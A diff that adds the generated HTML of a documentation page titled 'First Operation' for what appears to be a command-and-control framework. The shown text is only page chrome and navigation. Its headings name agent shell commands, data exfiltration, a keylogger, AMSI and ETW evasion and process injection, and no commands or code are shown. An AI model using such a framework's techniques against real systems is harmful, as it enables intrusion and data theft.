@@ -1,0 +1,1977 @@
+
+<!DOCTYPE html>
+
+<html class="no-js" lang="pt">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<meta content="Comprehensive documentation for the Wolfgang C2 Framework" name="description"/>
+<link href="../first-implant/" rel="prev"/>
+<link href="../next-steps/" rel="next"/>
+<link href="./" hreflang="pt-BR" rel="alternate"/>
+<link href="../../en/getting-started/first-operation/" hreflang="en" rel="alternate"/>
+<link href="../../assets/images/favicon.png" rel="icon"/>
+<meta content="mkdocs-1.6.1, mkdocs-material-9.7.5" name="generator"/>
+<title>First Operation - Wolfgang C2 Framework</title>
+<link href="../../assets/stylesheets/main.484c7ddc.min.css" rel="stylesheet"/>
+<link href="../../assets/stylesheets/palette.ab4e12ef.min.css" rel="stylesheet"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/>
+<style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+<script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+</head>
+<body data-md-color-accent="purple" data-md-color-primary="deep-purple" data-md-color-scheme="slate" dir="ltr">
+<input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
+<input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
+<label class="md-overlay" for="__drawer"></label>
+<div data-md-component="skip">
+<a class="md-skip" href="#primeira-operacao">
+          Pular para conteúdo
+        </a>
+</div>
+<div data-md-component="announce">
+</div>
+<header class="md-header" data-md-component="header">
+<nav aria-label="Cabeçalho" class="md-header__inner md-grid">
+<a aria-label="Wolfgang C2 Framework" class="md-header__button md-logo" data-md-component="logo" href="../.." title="Wolfgang C2 Framework">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+</a>
+<label class="md-header__button md-icon" for="__drawer">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+</label>
+<div class="md-header__title" data-md-component="header-title">
+<div class="md-header__ellipsis">
+<div class="md-header__topic">
+<span class="md-ellipsis">
+            Wolfgang C2 Framework
+          </span>
+</div>
+<div class="md-header__topic" data-md-component="header-topic">
+<span class="md-ellipsis">
+            
+              First Operation
+            
+          </span>
+</div>
+</div>
+</div>
+<form class="md-header__option" data-md-component="palette">
+<input aria-label="Switch to light mode" class="md-option" data-md-color-accent="purple" data-md-color-media="" data-md-color-primary="deep-purple" data-md-color-scheme="slate" id="__palette_0" name="__palette" type="radio"/>
+<label class="md-header__button md-icon" for="__palette_1" hidden="" title="Switch to light mode">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
+</label>
+<input aria-label="Switch to dark mode" class="md-option" data-md-color-accent="purple" data-md-color-media="" data-md-color-primary="deep-purple" data-md-color-scheme="default" id="__palette_1" name="__palette" type="radio"/>
+<label class="md-header__button md-icon" for="__palette_0" hidden="" title="Switch to dark mode">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
+</label>
+</form>
+<script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+<div class="md-header__option">
+<div class="md-select">
+<button aria-label="Selecione o idioma" class="md-header__button md-icon">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12.87 15.07-2.54-2.51.03-.03A17.5 17.5 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2zm-2.62 7 1.62-4.33L19.12 17z"></path></svg>
+</button>
+<div class="md-select__inner">
+<ul class="md-select__list">
+<li class="md-select__item">
+<a class="md-select__link" href="./" hreflang="pt-BR">
+              Português
+            </a>
+</li>
+<li class="md-select__item">
+<a class="md-select__link" href="../../en/getting-started/first-operation/" hreflang="en">
+              English
+            </a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+<label class="md-header__button md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+</label>
+<div class="md-search" data-md-component="search" role="dialog">
+<label class="md-search__overlay" for="__search"></label>
+<div class="md-search__inner" role="search">
+<form class="md-search__form" name="search">
+<input aria-label="Buscar" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="Buscar" required="" spellcheck="false" type="text"/>
+<label class="md-search__icon md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+</label>
+<nav aria-label="Pesquisar" class="md-search__options">
+<button aria-label="Limpar" class="md-search__icon md-icon" tabindex="-1" title="Limpar" type="reset">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+</button>
+</nav>
+<div class="md-search__suggest" data-md-component="search-suggest"></div>
+</form>
+<div class="md-search__output">
+<div class="md-search__scrollwrap" data-md-scrollfix="" tabindex="0">
+<div class="md-search-result" data-md-component="search-result">
+<div class="md-search-result__meta">
+            Inicializando busca
+          </div>
+<ol class="md-search-result__list" role="presentation"></ol>
+</div>
+</div>
+</div>
+</div>
+</div>
+</nav>
+</header>
+<div class="md-container" data-md-component="container">
+<nav aria-label="Abas" class="md-tabs" data-md-component="tabs">
+<div class="md-grid">
+<ul class="md-tabs__list">
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../..">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+</li>
+<li class="md-tabs__item md-tabs__item--active">
+<a class="md-tabs__link" href="../">
+          
+  
+  
+    
+  
+  Getting Started
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../operator-guide/">
+          
+  
+  
+    
+  
+  Operator Guide
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../architecture/">
+          
+  
+  
+    
+  
+  Architecture
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../developer-guide/">
+          
+  
+  
+    
+  
+  Developer Guide
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../tradecraft/">
+          
+  
+  
+    
+  
+  Tradecraft
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../modules/">
+          
+  
+  
+    
+  
+  Module Catalog
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../api/">
+          
+  
+  
+    
+  
+  API Reference
+
+        </a>
+</li>
+</ul>
+</div>
+</nav>
+<main class="md-main" data-md-component="main">
+<div class="md-main__inner md-grid">
+<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav aria-label="Navegação" class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" data-md-level="0">
+<label class="md-nav__title" for="__drawer">
+<a aria-label="Wolfgang C2 Framework" class="md-nav__button md-logo" data-md-component="logo" href="../.." title="Wolfgang C2 Framework">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+</a>
+    Wolfgang C2 Framework
+  </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../..">
+<span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+<input checked="" class="md-nav__toggle md-toggle" id="__nav_2" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../">
+<span class="md-ellipsis">
+    
+  
+    Getting Started
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="true" aria-labelledby="__nav_2_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_2">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Getting Started
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../quickstart/">
+<span class="md-ellipsis">
+    
+  
+    Quickstart
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../first-implant/">
+<span class="md-ellipsis">
+    
+  
+    First Implant
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--active">
+<input class="md-nav__toggle md-toggle" id="__toc" type="checkbox"/>
+<label class="md-nav__link md-nav__link--active" for="__toc">
+<span class="md-ellipsis">
+    
+  
+    First Operation
+  
+
+    
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<a class="md-nav__link md-nav__link--active" href="./">
+<span class="md-ellipsis">
+    
+  
+    First Operation
+  
+
+    
+  </span>
+</a>
+<nav aria-label="Índice" class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">
+<span class="md-nav__icon md-icon"></span>
+      Índice
+    </label>
+<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#1-selecionar-o-agent">
+<span class="md-ellipsis">
+      
+        1. Selecionar o Agent
+      
+    </span>
+</a>
+<nav aria-label="1. Selecionar o Agent" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#comandos-disponiveis-no-contexto-do-agent">
+<span class="md-ellipsis">
+      
+        Comandos disponiveis no contexto do agent
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#2-executar-modulos">
+<span class="md-ellipsis">
+      
+        2. Executar Modulos
+      
+    </span>
+</a>
+<nav aria-label="2. Executar Modulos" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#comando-unico-exec">
+<span class="md-ellipsis">
+      
+        Comando unico: exec
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#shell-interativo-shell">
+<span class="md-ellipsis">
+      
+        Shell interativo: shell
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#reconnaissance-sysinfo">
+<span class="md-ellipsis">
+      
+        Reconnaissance: sysinfo
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#modulo-generico-run">
+<span class="md-ellipsis">
+      
+        Modulo generico: run
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#3-ciclo-de-vida-de-uma-task">
+<span class="md-ellipsis">
+      
+        3. Ciclo de Vida de uma Task
+      
+    </span>
+</a>
+<nav aria-label="3. Ciclo de Vida de uma Task" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#estados-de-uma-task">
+<span class="md-ellipsis">
+      
+        Estados de uma task
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#timing-e-latencia">
+<span class="md-ellipsis">
+      
+        Timing e latencia
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#listar-tasks-do-agent">
+<span class="md-ellipsis">
+      
+        Listar tasks do agent
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#4-operacoes-com-arquivos">
+<span class="md-ellipsis">
+      
+        4. Operacoes com Arquivos
+      
+    </span>
+</a>
+<nav aria-label="4. Operacoes com Arquivos" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#upload-operador-alvo">
+<span class="md-ellipsis">
+      
+        Upload: operador -&gt; alvo
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#download-alvo-operador">
+<span class="md-ellipsis">
+      
+        Download: alvo -&gt; operador
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#5-exfiltracao-de-dados">
+<span class="md-ellipsis">
+      
+        5. Exfiltracao de Dados
+      
+    </span>
+</a>
+<nav aria-label="5. Exfiltracao de Dados" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#iniciar-exfiltracao">
+<span class="md-ellipsis">
+      
+        Iniciar exfiltracao
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#monitorar-sessoes-de-exfiltracao">
+<span class="md-ellipsis">
+      
+        Monitorar sessoes de exfiltracao
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#download-do-arquivo-exfiltrado">
+<span class="md-ellipsis">
+      
+        Download do arquivo exfiltrado
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#parametros-opcionais-da-exfiltracao">
+<span class="md-ellipsis">
+      
+        Parametros opcionais da exfiltracao
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#6-outras-operacoes-uteis">
+<span class="md-ellipsis">
+      
+        6. Outras Operacoes Uteis
+      
+    </span>
+</a>
+<nav aria-label="6. Outras Operacoes Uteis" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#screenshot">
+<span class="md-ellipsis">
+      
+        Screenshot
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#port-forwarding">
+<span class="md-ellipsis">
+      
+        Port forwarding
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#socks-proxy">
+<span class="md-ellipsis">
+      
+        SOCKS proxy
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#keylogger">
+<span class="md-ellipsis">
+      
+        Keylogger
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#resumo-do-fluxo">
+<span class="md-ellipsis">
+      
+        Resumo do Fluxo
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#veja-tambem">
+<span class="md-ellipsis">
+      
+        Veja tambem
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../next-steps/">
+<span class="md-ellipsis">
+    
+  
+    Next Steps
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_3" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../operator-guide/">
+<span class="md-ellipsis">
+    
+  
+    Operator Guide
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_3_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_3">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Operator Guide
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/server-setup/">
+<span class="md-ellipsis">
+    
+  
+    Server Setup
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/listeners/">
+<span class="md-ellipsis">
+    
+  
+    Listeners
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/implant-generation/">
+<span class="md-ellipsis">
+    
+  
+    Implant Generation
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/cli-reference/">
+<span class="md-ellipsis">
+    
+  
+    CLI Reference
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/agent-management/">
+<span class="md-ellipsis">
+    
+  
+    Agent Management
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/task-system/">
+<span class="md-ellipsis">
+    
+  
+    Task System
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/modules/">
+<span class="md-ellipsis">
+    
+  
+    Modules
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/exfiltration/">
+<span class="md-ellipsis">
+    
+  
+    Exfiltration
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/redirectors/">
+<span class="md-ellipsis">
+    
+  
+    Redirectors
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/plugins/">
+<span class="md-ellipsis">
+    
+  
+    Plugins
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_4" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../architecture/">
+<span class="md-ellipsis">
+    
+  
+    Architecture
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_4_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_4">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Architecture
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/overview/">
+<span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/protocol/">
+<span class="md-ellipsis">
+    
+  
+    Protocol
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/crypto/">
+<span class="md-ellipsis">
+    
+  
+    Cryptography
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/transport/">
+<span class="md-ellipsis">
+    
+  
+    Transport
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/modules/">
+<span class="md-ellipsis">
+    
+  
+    Modules
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/storage/">
+<span class="md-ellipsis">
+    
+  
+    Storage
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/auth/">
+<span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/plugins/">
+<span class="md-ellipsis">
+    
+  
+    Plugins
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../architecture/implant-internals/">
+<span class="md-ellipsis">
+    
+  
+    Implant Internals
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_5" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../developer-guide/">
+<span class="md-ellipsis">
+    
+  
+    Developer Guide
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_5_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_5">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Developer Guide
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/project-structure/">
+<span class="md-ellipsis">
+    
+  
+    Project Structure
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/adding-modules/">
+<span class="md-ellipsis">
+    
+  
+    Adding Modules
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/adding-transports/">
+<span class="md-ellipsis">
+    
+  
+    Adding Transports
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/plugin-sdk/">
+<span class="md-ellipsis">
+    
+  
+    Plugin SDK
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/testing/">
+<span class="md-ellipsis">
+    
+  
+    Testing
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/build-system/">
+<span class="md-ellipsis">
+    
+  
+    Build System
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/">
+<span class="md-ellipsis">
+    
+  
+    Tradecraft
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_6">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Tradecraft
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_2" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/evasion/">
+<span class="md-ellipsis">
+    
+  
+    Evasion
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_2" id="__nav_6_2_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_2_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_2">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Evasion
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/amsi-bypass/">
+<span class="md-ellipsis">
+    
+  
+    AMSI Bypass
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/etw-bypass/">
+<span class="md-ellipsis">
+    
+  
+    ETW Bypass
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/sandbox-detection/">
+<span class="md-ellipsis">
+    
+  
+    Sandbox Detection
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/sleep-obfuscation/">
+<span class="md-ellipsis">
+    
+  
+    Sleep Obfuscation
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/direct-syscalls/">
+<span class="md-ellipsis">
+    
+  
+    Direct Syscalls
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/memory-encryption/">
+<span class="md-ellipsis">
+    
+  
+    Memory Encryption
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/hwbp-bypass/">
+<span class="md-ellipsis">
+    
+  
+    HWBP Bypass
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_3" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/injection/">
+<span class="md-ellipsis">
+    
+  
+    Injection
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_3" id="__nav_6_3_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_3_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_3">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Injection
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/injection/process-hollowing/">
+<span class="md-ellipsis">
+    
+  
+    Process Hollowing
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/injection/earlybird-apc/">
+<span class="md-ellipsis">
+    
+  
+    EarlyBird APC
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/injection/module-stomping/">
+<span class="md-ellipsis">
+    
+  
+    Module Stomping
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/injection/reflective-loading/">
+<span class="md-ellipsis">
+    
+  
+    Reflective Loading
+  
+
+    
+  </span>
